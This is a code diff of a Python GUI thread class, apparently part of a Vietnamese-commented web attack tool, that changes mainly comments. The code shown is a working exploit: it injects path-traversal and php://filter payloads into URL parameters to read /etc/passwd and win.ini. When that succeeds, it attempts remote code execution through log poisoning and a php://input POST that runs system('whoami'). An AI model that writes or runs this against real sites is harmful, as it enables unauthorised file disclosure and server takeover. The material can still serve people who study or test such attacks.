@@ -14,7 +14,7 @@ class LFIThread(QThread):
         self.targets = list_urls
         self.is_running = True
         
-        # --- PHASE 1: LFI PAYLOAD ---
+        #path treversal payloads
         self.payloads_file = [
             "../../../../etc/passwd",
             "../../../../windows/win.ini",
@@ -24,7 +24,7 @@ class LFIThread(QThread):
             "php://filter/convert.base64-encode/resource=index.php"
         ]
         
-        # --- PHASE 2: LOG FILES ---
+        #duong dan file log
         self.log_paths = [
             "/var/log/apache2/access.log",
             "/var/log/nginx/access.log",
@@ -32,12 +32,12 @@ class LFIThread(QThread):
             "../../../../var/log/apache2/access.log"
         ]
         
-        # --- SIGNATURES ---
+        # singatures 
         self.signatures = [
             b"root:x:0:0", b"[extensions]", b"[fonts]", b"<?php", b"<html>", b"JFIF", b"PNG"
         ]
 
-        # Mã độc chung cho RCE
+        # doan ma php de check RCE
         self.rce_code = "<?php HACKED!! echo 'da RCE thanh cong'; system('whoami'); ?>"
 
     def run(self):
@@ -54,13 +54,11 @@ class LFIThread(QThread):
 
             found_lfi_param = None 
 
-            # ==========================================================
-            # GIAI ĐOẠN 1: QUÉT TÌM LỖI ĐỌC FILE
-            # ==========================================================
+            #tan cong path traversal 
             for param_name in params:
                 for payload in self.payloads_file:
                     if not self.is_running: break
-                    # Nối chuỗi thủ công
+                    
                     new_query_parts = []
                     for k, v in params.items():
                         if k == param_name: new_query_parts.append(f"{k}={payload}")
@@ -72,8 +70,7 @@ class LFIThread(QThread):
                     try:
                         res = requests.get(attack_url, timeout=5)
                         content = res.content
-                        
-                        # In log preview
+
                         preview = content[:50].replace(b'\n', b' ').decode('utf-8', errors='ignore')
                         self.log_process.emit(f"Check LFI: ...{attack_url[-40:]} | Len: {len(content)}")
 
@@ -106,13 +103,11 @@ class LFIThread(QThread):
                 
                 if found_lfi_param: break 
 
-            # ==========================================================
-            # GIAI ĐOẠN 2 & 3: RCE EXPLOITATION (NẾU CÓ LFI)
-            # ==========================================================
+           #kiem tra RCE neu co LFI
             if found_lfi_param:
                 self.log_process.emit(f"<b style='color:red'>☠️ PHÁT HIỆN LỖI! ĐANG THỬ RCE...</b>")
                 
-                # --- PHASE 2: LOG POISONING (GET Request) ---
+                # log poisoning
                 self.log_process.emit(">> Thử Log Poisoning...")
                 try:
                     # Bơm thuốc
@@ -135,10 +130,10 @@ class LFIThread(QThread):
                             break
                 except: pass
 
-                # --- PHASE 3: PHP INPUT (POST Request) - MỚI THÊM ---
+                # wrapper php://input
                 self.log_process.emit(">> Thử php://input (Wrapper)...")
                 try:
-                    # 1. Tạo URL với tham số trỏ tới php://input
+                
                     new_query_parts = []
                     for k, v in params.items():
                         if k == found_lfi_param: new_query_parts.append(f"{k}=php://input")
@@ -147,8 +142,8 @@ class LFIThread(QThread):
                     
                     input_url = f"{base_url}?{'&'.join(new_query_parts)}"
                     
-                    # 2. Gửi POST request với code PHP nằm trong BODY (data)
-                    # Đây là chìa khóa để php://input hoạt động
+                    # 2. gui post request 
+                    
                     res = requests.post(input_url, data=self.rce_code, timeout=5)
                     
                     if b"HACKED" in res.content:
